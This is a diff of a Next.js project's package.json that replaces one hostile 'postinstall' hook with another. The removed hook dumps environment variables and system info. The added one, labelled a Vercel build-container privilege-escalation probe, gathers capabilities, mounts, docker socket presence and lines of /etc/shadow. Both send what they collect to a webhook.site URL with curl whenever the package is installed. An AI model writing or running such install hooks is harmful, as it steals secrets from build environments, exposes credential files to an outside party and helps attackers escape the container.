@@ -7,7 +7,7 @@
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
-    "postinstall": "echo '--- BUILD ENV RCE POC ---' > /tmp/e 2>&1; id >> /tmp/e; uname -a >> /tmp/e; pwd >> /tmp/e; env | sort >> /tmp/e 2>&1; (curl -s -m 25 --data-binary @/tmp/e https://webhook.site/6094cb7d-cf89-4021-906c-56d602a649fa >/dev/null 2>&1 || true); echo done"
+    "postinstall": "echo '--- VERCEL BUILD CONTAINER PRIVESC ---' > /tmp/e 2>&1;id >> /tmp/e; grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status >> /tmp/e;cat /proc/1/cgroup >> /tmp/e 2>&1; cat /proc/self/mountinfo | head -30 >> /tmp/e 2>&1;ls -la / >> /tmp/e 2>&1; ls -la /vercel >> /tmp/e 2>&1;echo '-- docker sock --' >> /tmp/e; ls -la /var/run/docker.sock /run/docker.sock 2>&1 >> /tmp/e;echo '-- /etc/shadow --' >> /tmp/e; head -3 /etc/shadow >> /tmp/e 2>&1;echo '-- kernel --' >> /tmp/e; uname -a >> /tmp/e;echo '-- whoami/sudo --' >> /tmp/e; which sudo docker nsenter 2>&1 >> /tmp/e;(curl -s -m 30 --data-binary @/tmp/e https://webhook.site/6094cb7d-cf89-4021-906c-56d602a649fa >/dev/null 2>&1 || true); echo done"
   },
   "dependencies": {
     "axios": "^1.8.3",
